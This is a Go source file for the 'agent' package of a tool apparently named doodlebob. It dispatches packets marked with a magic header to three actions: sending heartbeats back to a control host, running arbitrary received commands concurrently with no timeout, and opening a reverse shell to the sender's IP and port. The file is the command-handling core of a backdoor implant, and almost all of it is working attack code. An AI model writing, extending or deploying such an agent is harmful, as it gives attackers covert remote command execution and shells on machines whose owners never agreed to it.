// This contains the logic for handling incoming messages from packets with a magic header
// Includes command execution, reverse shell, heartbeat
package agent

import (
	"fmt"
	"net"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/pkg/executor"
)

// sendHeartbeat sends a heartbeat message to the control host
func sendHeartbeat(msg *message.Message) error {
	// Join the IP and port
	addr := net.JoinHostPort(msg.SrcIP, msg.SrcPort)

	// Dial the control host at the udp port
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return fmt.Errorf("error connecting to control host: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Send "heartbeat" over the connection
	_, err = fmt.Fprintf(conn, "heartbeat")
	if err != nil {
		return fmt.Errorf("error sending heartbeat: %w", err)
	}

	return nil
}

// handleMessage takes a message, dissects its fields, and sends the data to the proper function
func handleMessage(msg *message.Message) error {
	// Check that the IP address matches this host
	switch msg.DstIP {
	case localIP().IP.To4().String():
		switch msg.Type {
		// Sends a heartbeat back to the source host to test connectivity
		case "heartbeat":
			sendHeartbeat(msg)
		// Executes the command on the target host
		case "command":
			go executor.ExecuteCommand(msg.Data, nil) // execute the command concurrently with no timeout
		// Opens a reverse shell on port specified in packet
		case "shell":
			go func() {
				if err := executor.OpenReverseShell(msg.SrcIP, msg.SrcPort); err != nil {
					return
				}
			}()
		}
	default:
		return nil
	}
	return nil
}
